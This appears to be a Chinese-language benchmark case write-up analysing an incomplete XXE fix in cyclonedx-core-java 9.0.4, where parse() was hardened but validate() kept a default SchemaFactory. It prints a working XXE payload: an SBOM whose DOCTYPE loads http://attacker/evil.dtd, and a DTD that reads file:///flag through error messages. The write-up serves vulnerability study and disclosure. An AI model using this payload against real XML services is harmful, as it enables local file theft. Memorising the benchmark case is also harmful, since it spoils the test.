# cyclonedx-core-java 9.0.4：解析器用了安全的 DocumentBuilder，校验器的 SchemaFactory 还是默认的

- Case：`PCBV2-0092`（`cyclonedx-cve-2025-64518`）
- 产品：`org.cyclonedx:cyclonedx-core-java`。本 case 从 Maven Central 装整包 8.0.0 / 9.0.4 / 11.0.1，薄 HTTP 层把 body 交给真实的 `XmlParser.parse` / `XmlParser.validate`。
- 链：CVE-2024-38374（≥2.1.0,<9.0.4 → 9.0.4，PR #434 / commit `ab0bc9c`，GHSA-683x-4444-jxh8）→ CVE-2025-64518（<11.0.1 → 11.0.1，PR #737，GHSA-6fhj-vr9j-g45r）
- 源码对着 tag `cyclonedx-core-java-9.0.4` 的 `XmlParser.java`（`parse`、`createSecureDocument`、`validate`）和 `CycloneDxSchema.java`（`getXmlSchema(InputStream...)`）。V2 对着 11.0.1 同一 `getXmlSchema` 上的 `ACCESS_EXTERNAL_DTD`。运行时是发布包的 310 个 `org.cyclonedx` class，不是抽函数。

2024 年 6 月，9.0.4 修了「解析 XML BOM 之前用 XPath 读命名空间」时默认 `DocumentBuilder` 会解析外部实体。补丁换成 `createSecureDocument`：`ACCESS_EXTERNAL_DTD=""`、`ACCESS_EXTERNAL_SCHEMA=""`。同一类里的 `validate()` 仍然 `getXmlSchema(...).newValidator().validate(source)`，而 `CycloneDxSchema.getXmlSchema` 新建的 `SchemaFactory` **没有任何** 外部访问限制。GHSA-6fhj-vr9j-g45r 原话：*The fix for GHSA-683x-4444-jxh8 / CVE-2024-38374 has been incomplete in that it only fixed parsing of XML BOMs, but not validation.*

根因不只是「忘了抄两行属性」。检查插在 parse 用来认 schema 版本的那一次 DOM 构建上；validate 走的是另一套 JAXP 工厂，默认仍然解析 DTD。下面按两份入口走进去、9.0.4 改了哪一段、validate 如何从 SchemaFactory 生出 Validator、OWASP 已经写过的 SchemaFactory 配置有没有挂上，把这几层写完。

---

## 这块功能本来在干什么

cyclonedx-core-java 给 Java 应用解析和 **校验** CycloneDX XML SBOM。两个常用入口：

```java
new XmlParser().parse(bomBytes);      // 反序列化成 Bom
new XmlParser().validate(bomBytes);   // 用 XSD 校验，返回 List<ParseException>
```

本 case 的服务原样暴露它们：

```http
POST /parse      → XmlParser.parse(body)
POST /validate   → XmlParser.validate(body)
```

设计意图：传入的 XML 是 BOM，外部 DTD / 实体不该被解析，本地文件不该被读。成功穿越之后的效果是 **JAXP 解析器解析了 DOCTYPE 里的外部参数实体，把 `file:///flag` 读进库自己的异常文本**。flag 不在 XML 字面量里。

数据流：

```text
XML SBOM（DOCTYPE → http://attacker/evil.dtd → file:///flag）
    → parse()
         identifySchemaVersion → extractAllNamespaceDeclarations
              V0：XPath + 默认 DocumentBuilder     ← XXE 开
              V1：createSecureDocument             ← 补丁插在这里
         XmlMapper.readValue → Bom
    → validate()  （独立入口，不经过 createSecureDocument）
         getXmlSchema(version) → SchemaFactory.newInstance(...).newSchema(...)
         schema.newValidator().validate(StreamSource)
              V0/V1：SchemaFactory 未设 ACCESS_EXTERNAL_*   ← 仍 XXE
              V2：ACCESS_EXTERNAL_DTD/SCHEMA="" + FEATURE_SECURE_PROCESSING
```

没有登录。应用把用户 XML 同时交给 parse 和 validate 是常见写法（先校验再入库）。

---

## 原始漏洞：parse 路径上的默认 DocumentBuilder（CVE-2024-38374，8.0.0）

8.0.0 的 `parse(byte[])` 为了读 xmlns、决定 schema 版本，对整份文档跑 XPath `//namespace::*`。`XPathExpression.evaluate(InputSource)` 内部用默认（不安全）的 DocumentBuilder，会加载外部 DTD。

NVD：*Before deserializing CycloneDX Bill of Materials in XML format, cyclonedx-core-java leverages XPath expressions to determine the schema version of the BOM. The DocumentBuilderFactory used to evaluate XPath expressions was not configured securely.*

本 case 的 seed XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bom [
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
<bom xmlns="http://cyclonedx.org/schema/bom/1.6"/>
```

`evil.dtd` 做 error-based 读文件：

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'file:///PCBERR/%file;'>">
%eval;
%exfil;
```

8.0.0 的 parse 解析 DTD，去读 `/flag`，再试图打开 `/PCBERR/<flag内容>`，库的异常里出现 `java.io.FileNotFoundException: /PCBERR/PCBFLAG_...`。HTTP 把异常链回显。v0 + `--seed` 退出码 0。

同一份 XML 在 8.0.0 的 `validate()` 上同样 XXE——但 CVE-2024-38374 的叙事和补丁都对着 **parse 的 XPath DocumentBuilder**。

---

## 维护者改了什么（CVE-2024-38374 修复，9.0.4）

PR #434 / commit `ab0bc9c530d24f737970dbd0287d1190b129853d` 删掉 XPath，改用「安全」DOM 抽命名空间。tag `cyclonedx-core-java-9.0.4` 的 `parse`：

```java
# XmlParser.java :: parse(byte[])  (9.0.4)
    public Bom parse(final byte[] bomBytes) throws ParseException {
        try {
            final String schemaVersion = identifySchemaVersion(
                new InputSource(new ByteArrayInputStream(bomBytes)));
            return injectSchemaVersion(mapper.readValue(bomBytes, Bom.class), schemaVersion);
        } catch (IOException | ParserConfigurationException | SAXException e) {
            throw new ParseException(e);
        }
    }
```

真正加属性的是：

```java
# XmlParser.java :: createSecureDocument  (9.0.4)
    private Document createSecureDocument(InputSource in)
        throws ParserConfigurationException, IOException, SAXException
    {
        //https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xpathexpression
        DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
        df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        DocumentBuilder builder = df.newDocumentBuilder();
        return builder.parse(in);
    }
```

注释指向 OWASP 的 **XPathExpression** 一节，和 CVE 描述一致：他们修的是「给 XPath 用的那次 parse」。

`extractAllNamespaceDeclarations` 改为 `Document doc = createSecureDocument(in)`。对 seed 这种外部 DTD：

```text
External Entity: Failed to read external document 'evil.dtd', because 'http' access is not allowed due to restriction set by the accessExternalDTD property.
```

`/flag` 不会被读，响应里没有金丝雀。v1 + `--seed` 退出码 10。

同一文件里的 `validate` **一行安全属性都没加**：

```java
# XmlParser.java :: validate(Source, Version)  (9.0.4)
    public List validate(final Source source, final Version schemaVersion) throws IOException {
        final List exceptions = new LinkedList<>();
        try {
            final Schema schema = getXmlSchema(schemaVersion);
            final Validator validator = schema.newValidator();
            ...
            validator.validate(source);
```

`getXmlSchema` 来自父类 `CycloneDxSchema`。9.0.4：

```java
# CycloneDxSchema.java :: getXmlSchema(InputStream...)  (9.0.4)
    public Schema getXmlSchema(InputStream... inputStreams) throws SAXException {
        final SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
        final Source[] schemaFiles = new Source[inputStreams.length];
        for (int i = 0; i < inputStreams.length; i++) {
            schemaFiles[i] = new StreamSource(inputStreams[i]);
        }
        return schemaFactory.newSchema(schemaFiles);
    }
```

默认 `SchemaFactory` 会让派生的 `Validator` 解析实例文档里的 DTD。OWASP 同一份 cheat sheet 另有 **SchemaFactory** 一节，要求 `ACCESS_EXTERNAL_DTD` / `ACCESS_EXTERNAL_SCHEMA` / `FEATURE_SECURE_PROCESSING`。9.0.4 的注释只链到 XPath 那一节。

补丁默认：BOM 的外部实体只会在「认版本号的那次 DOM parse」里被触发。应用如果只 `validate()`、或先 validate 再 parse，这条默认不成立。

---

## 检查之后谁真正消费那个值

`createSecureDocument` 的返回值只用于抽 xmlns，然后丢掉。`XmlMapper.readValue` 是另一轮解析（Jackson XML，通常不跟 DTD）。所以 V1 对 **parse 入口** 来说，危险窗口就是那一次安全 DOM。

`validate` 根本不调用 `createSecureDocument`。它把同一份 `byte[]` 包成 `StreamSource`，交给 `Validator.validate`。消费用户 XML 的是 **未加固的 Validator**，不是刚设过 `ACCESS_EXTERNAL_DTD=""` 的 DocumentBuilder。

实例文档里的 `<!DOCTYPE ... SYSTEM "http://attacker/evil.dtd">` 由 Validator 的解析器加载。DTD 里的 `%file SYSTEM "file:///flag"` 照样执行。flag 出现在 `ParseException` 的 cause 链里（`FileNotFoundException: /PCBERR/<flag>`），服务把 `dump(pe)` 写进 HTTP body。

两套 JAXP 工厂、两次解析、同一份 DOCTYPE。过滤器只包了其中一次。

---

## 仓库里已经有「安全 DocumentBuilder」的写法，validate 没用

`createSecureDocument` 就在 `XmlParser.java` 里，和 `validate()` 相隔几十行。没有人把那两行 `setAttribute` 抽成共用的 `secureSchemaFactory()`。`CycloneDxSchema` 是 parse 和 validate 的共同父类，本来就是挂 SchemaFactory 属性的地方——V2 后来就是改这里。

JSON 路径 `getJsonSchema` 用的是 networknt，不走 DTD。XML validate 是唯一仍用 JAXP SchemaFactory 的入口。不是没有更强的谓词，是 **谓词只挂在 parse 认版本的 DOM 上**。

GHSA 给的 workaround 也侧面说明这一点：若确定传入的是 JSON，在交给库 **validate** 之前拒掉 XML。他们没有说「升级到 9.0.4 就够了」。

---

## 这个补丁挡住了什么、没挡住什么

- parse / `createSecureDocument`：`ACCESS_EXTERNAL_DTD=""` → 外部 DTD 的 `http` 被拒
- validate / 默认 SchemaFactory：实例文档仍解析 DOCTYPE → 同一 `http://attacker/evil.dtd` 仍加载

payload **字节级相同**。变的是调用哪一个方法：

```text
同一 XXE_SBOM
    POST /parse     → V1 拒绝 evil.dtd，无 flag
    POST /validate  → V1 Validator 加载 evil.dtd，读 /flag，异常含 PCBFLAG_...
```

没有换编码、没有换协议、没有绕过 `ACCESS_EXTERNAL_DTD` 字符串。只是走到了补丁没有改到的那条 JAXP 链。

seed 被挡住只说明「认 xmlns 的那次 parse 不再解析 DTD」，不说明「这份库处理 XML 时不再解析 DTD」。

---

## 残余走的是兄弟入口 validate，不是 parse（CVE-2025-64518）

平台 verify 的 residual 打 `POST /validate`，seed 打 `POST /parse`。这与 heldout 一致，也与 advisory 一致：**不完整修复是兄弟代码路径，不是同一函数里换了一种实体写法**。效果通道相同（error-based 读 `/flag`，flag 出现在库异常文本里），sink 是 `Validator.validate`，不是 `createSecureDocument`。

仍应分析源码层残余：V1 的 `getXmlSchema` 未加固，同一份恶意 SBOM 在 validate 上复现 CVE-2024-38374 在 parse 上做过的事。

v1 + `--residual`：响应含 `FileNotFoundException: /PCBERR/PCBFLAG_...`。没有换 DTD、没有换 attacker 服务。

---

## 后来又补了什么（CVE-2025-64518，11.0.1）

PR #737 改 `CycloneDxSchema.getXmlSchema(InputStream...)`。tag `cyclonedx-core-java-11.0.1`：

```java
# CycloneDxSchema.java :: getXmlSchema  (11.0.1)
    public Schema getXmlSchema(InputStream... inputStreams) throws SAXException {
        final SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
        schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        schemaFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        ...
        return schemaFactory.newSchema(schemaFiles);
    }
```

属性会传到 `newValidator()`。外部 DTD 再次因 `accessExternalDTD` 被拒，validate 路径不再读 `/flag`。NVD：*fixed in cyclonedx-core-java version 11.0.1*。

9.0.4 到 11.0.1 中间还有其它发行版；advisory 写 affected `<11.0.1`。本 case 的 V1 钉在 9.0.4（CVE-2024-38374 刚合上、validate 仍开），V2 钉在 11.0.1。

即便 V2 加固了 SchemaFactory，若还有第三条 XML 入口（自定义 XPath、另一个 DocumentBuilder）未设同样属性，需要另证。本 benchmark 关闭的是 `/validate` 这条 reference residual。

---

## 从这条链还能看出什么

**维护者改错了哪一层。**  
他们改了「parse 为了读版本号而构建 DOM」的工厂。用户 XML 还会作为 `StreamSource` 进 Validator。V2 才改生产 Schema 的工厂。

**不是没有文档。**  
`createSecureDocument` 的注释已经指向 OWASP XXE cheat sheet。同一页的下一节就是 SchemaFactory。补丁停在注释所链的那一节。

**同一份 DOCTYPE，两个公开方法。**  
`Parser` 接口同时提供 `parse` 和 `validate`。只修其中一个，等于默认「调用方不会走另一个」。SBOM 网关通常两个都走。

**Jackson `readValue` 不是这条 XXE 的 sink。**  
flag 来自 JAXP 解析 DTD 时的 file 实体。V1 parse 被挡住是因为安全 DOM 先失败；validate 没有这层。

**金丝雀在应用外是有意的。**  
`/flag` 由 compose 写入。能出现在异常路径 `/PCBERR/<flag>` 里，说明解析器真的做了 `file://` 读取，而不是回显了 XML 里的字面量。

---

## 版本、入口、参考

| | 版本 | `parse` / DocumentBuilder | `validate` / SchemaFactory | `/parse` + XXE SBOM | `/validate` + 同一 SBOM |
|---|---|---|---|---|---|
| V0 | 8.0.0 | 默认 XPath DOM | 默认 SchemaFactory | 异常含 flag | 异常含 flag |
| V1 | 9.0.4 | `ACCESS_EXTERNAL_DTD=""` | **仍默认** | 拒 DTD，无 flag | 异常含 flag |
| V2 | 11.0.1 | 同 V1（parse 侧已硬） | `ACCESS_EXTERNAL_*=""` + FSP | 拒 | 拒 |

- Web：`POST /parse`、`POST /validate`，Content-Type `application/xml`
- 认证：v0 seed（/parse）观察到 flag；v1 seed 未观察到；v1 residual（/validate）观察到
- [CVE-2024-38374](https://nvd.nist.gov/vuln/detail/CVE-2024-38374)、[CVE-2025-64518](https://nvd.nist.gov/vuln/detail/CVE-2025-64518)
- [GHSA-683x-4444-jxh8](https://github.com/CycloneDX/cyclonedx-core-java/security/advisories/GHSA-683x-4444-jxh8)、[GHSA-6fhj-vr9j-g45r](https://github.com/CycloneDX/cyclonedx-core-java/security/advisories/GHSA-6fhj-vr9j-g45r)
- V1：[XmlParser.java @ 9.0.4](https://github.com/CycloneDX/cyclonedx-core-java/blob/cyclonedx-core-java-9.0.4/src/main/java/org/cyclonedx/parsers/XmlParser.java)、[CycloneDxSchema.java @ 9.0.4](https://github.com/CycloneDX/cyclonedx-core-java/blob/cyclonedx-core-java-9.0.4/src/main/java/org/cyclonedx/CycloneDxSchema.java)
- V2：[PR #737](https://github.com/CycloneDX/cyclonedx-core-java/pull/737)、[OWASP SchemaFactory](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#schemafactory)
